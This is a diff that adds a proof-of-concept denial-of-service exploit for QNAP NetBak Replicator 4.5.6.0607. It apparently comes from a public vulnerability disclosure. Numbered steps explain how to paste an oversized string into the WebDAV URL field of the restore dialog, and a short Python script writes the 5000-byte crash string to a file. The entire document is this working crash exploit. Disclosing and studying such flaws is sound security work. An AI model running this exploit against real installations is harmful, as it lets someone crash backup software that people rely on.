@@ -1,0 +1,25 @@
+# Exploit Title: QNAP NetBak Replicator 4.5.6.0607 Denial of Service (PoC)
+# Date: 2018-10-29
+# Exploit Author: Yair Rodríguez Aparicio
+# Vendor Homepage: https://www.qnap.com/en/
+# Software Link: https://www.qnap.com/en/download
+# Version: 4.5.6.0607
+# Tested on: Windows XP Profesional Español SP3 x86 
+
+# Steps to Produce the Crash:
+# 1.- Run python code : python qnap.py
+# 2.- Open text.txt and copy content to clipboard
+# 3.- Open NetBak Replicator.exe
+# 4.- click on Restauración Instantánea
+# 5.- Seleccione Origen -> "Ubicacion de red"
+# 6.- click on "Dirección URL WebDAV"
+# 7.- Paste ClipBoard on "Dirección URL WebDAV"
+# 8.- Click "Aceptar".
+# 9.- Crashed!
+ 
+
+ 
+buffer = "\x41" * 5000
+f = open("text.txt", "w")
+f.write(buffer)
+f.close()
